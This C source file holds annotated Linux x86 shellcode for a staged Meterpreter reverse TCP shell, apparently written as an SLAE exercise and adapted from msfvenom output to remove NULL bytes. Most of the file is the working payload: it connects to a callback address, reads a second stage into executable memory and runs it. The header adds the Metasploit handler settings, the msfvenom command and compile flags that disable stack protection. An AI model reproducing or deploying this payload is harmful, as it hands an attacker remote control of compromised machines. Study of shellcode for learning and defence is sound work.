/*

Architecture	  : x86
OS		  : Linux
Author		  : wetw0rk
ID		  : SLAE-958
Shellcode Size	  : 97 bytes
Connect Back Port : 12345
Description	  : This is a linux/x86/meterpreter/reverse_tcp shell. Created by
		    analysing msfvenom; The original shellcode has 10 NULL bytes
		    and comes in at 99 bytes. My shellcode is 97 and contains no
		    NULLS once the IP is swapped. Of course to use this shellcode
		    you need a metasploit handler although that should be assumed.
		    I would like to note this is a staged payload thus you MUST
		    have a handler setup.

Original Metasploit Shellcode:
	sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=12345 -i 0 -f c

PacketStorm Mirror:
	https://packetstormsecurity.com/files/143538/Linux-x86-TCP-Reverse-Shell.html

Swap ip using:
	wetw0rk@x86:~$ python
	>>> a = '192.168.244.129'.split('.')
	>>> '{:02X}{:02X}{:02X}{:02X}'.format(*map(int, a))

Metasploit Handler Settings:
	use exploit/multi/handler
	set PAYLOAD linux/x86/meterpreter/reverse_tcp
	set LHOST 0.0.0.0
	set LPORT 12345
	exploit

Test using:
	gcc -fno-stack-protector -z execstack tshell.c

Greets:
	offsec, abatchy (top llama), n4ss4r, dillage (top chinchilla), Hak5 Crew, rezkon, newbsec

*/

#include <stdio.h>
#include <string.h>

unsigned char code[]= \
// _start:
// int socketcall(int call, unsigned long *args)
"\xfc"			// cld			; clear the direction flag (re-added for reliability)
"\x31\xdb"		// xor ebx,ebx		; zero out EBX
"\xf7\xe3"		// mul ebx		; zero out EAX
"\x53"			// push ebx		; int socket(
"\x43"			// inc ebx		; protocol = 0 = IPPROTO_IP
"\x53"			// push ebx		; type     = 1 = SOCK_STREAM
"\x6a\x02"		// push 2		; domain   = 2 = AF_INET
"\xb0\x66"		// mov al,0x66		; 0x66 aka syscall for socketcall()
"\x89\xe1"		// mov ecx,esp		; (ESP) top of stack contains our args
"\xcd\x80"		// int 80h		; call that kernel!!!

// test for failure nice! (skape is an artist)
"\x85\xc0"		// test eax,eax		; set SF to 1 if eax < 0
"\x78\x48"		// js exit		; jump to exit if SF == 1

"\x97"			// xchg eax,edi		; place sockfd into EDI and 1 into EAX
"\x5b"			// pop ebx		; POP the top of stack into EBX (2)

// int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
"\x68\x7f\x00\x00\x01"	// push dword 0x100007f	; PUSH "127.0.0.1"
"\x66\x68\x30\x39"	// push word 0x3930	; PUSH "12345" (port)
"\x66\x6a\x02"		// push word 2		; PUSH 2 aka AF_INET
"\x89\xe1"		// mov ecx,esp		; save the pointer to the struct
"\x6a\x66"		// push byte +0x66	; PUSH 0x66 aka syscall for socketcall()
"\x58"			// pop eax		; POP it into EAX
"\x50"			// push eax		; PUSH EAX (syscall) onto the stack
"\x51"			// push ecx		; PUSH the struct pointer onto the stack
"\x57"			// push edi		; PUSH sockfd onto the stack
"\x89\xe1"		// mov ecx,esp		; MOV top of stack (args) into ECX
"\x43"			// inc ebx		; INC-rement EBX by 1 (EBX now = 3) aka SYS_CONNECT
"\xcd\x80"		// int 0x80		; call that kernel!!!

// test for failure (wicked)
"\x85\xc0"		// test eax,eax		; set SF to 1 if eax < 0
"\x78\x29"		// js exit		; jump to exit if SF == 1

// int mprotect(void *addr, size_t len, int prot)
"\xb2\x07"		// mov dl,0x7		; MOV 7 into DL
"\x31\xc9"		// xor ecx,ecx		; zero out the register
"\x66\xb9\xff\x0f"	// mov cx,0xfff		; MOV 0xfff into cx
"\x41"			// inc ecx		; 0x1000 or MAP_EXECUTABLE into ECX
"\x89\xe3"		// mov ebx,esp		; MOV ESP top of stack into EBX
"\xc1\xeb\x0c"		// shr ebx,byte 0xc	; SHR-ight EBX 12 times (EBX=0xbffff)
"\xc1\xe3\x0c"		// shl ebx,byte 0xc	; SHL-eft EBC 12 times (EBX=1) aka MCL_CURRENT
"\xb0\x7d"		// mov al,0x7d		; MOV 0x7d or syscall mprotect() into AL
"\xcd\x80"		// int 0x80		; call the kernel!

// test for failure (this is honestly sick)
"\x85\xc0"		// test eax,eax		; set SF to 1 if eax < 0
"\x78\x10"		// js exit		; jump to exit if SF == 1

// read(int fd, void *buf, size_t count)
"\x5b"			// pop ebx		; POP 3 into EBX or our socket descriptor
"\x89\xe1"		// mov ecx,esp		; MOV ESP ("12345") into ECX (our port)
"\x99"			// cdq			; zero out EDX register
"\xb6\x0c"		// mov dh,0xc		; MOV 12 into DH
"\xb0\x03"		// mov al,0x3		; syscall for read()
"\xcd\x80"		// int 0x80		; call the kernel

// test for failure nice ! (this is why it's so reliable)
"\x85\xc0"		// test eax,eax		; set SF to 1 if eax < 0
"\x78\x02"		// js exit		; jump to exit if SF == 1

"\xff\xe1"		// jmp ecx		; if al checks are good JMP to ECX (addr stored)

// exit:
"\xb0\x01"		// mov al,0x1		; syscall for exit()
"\xb3\x01"		// mov bl,0x1		; error code 1 (avoids null)
"\xcd\x80";		// int 0x80		; call kernel and exit

int main()
{
	printf("Shellcode Length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}

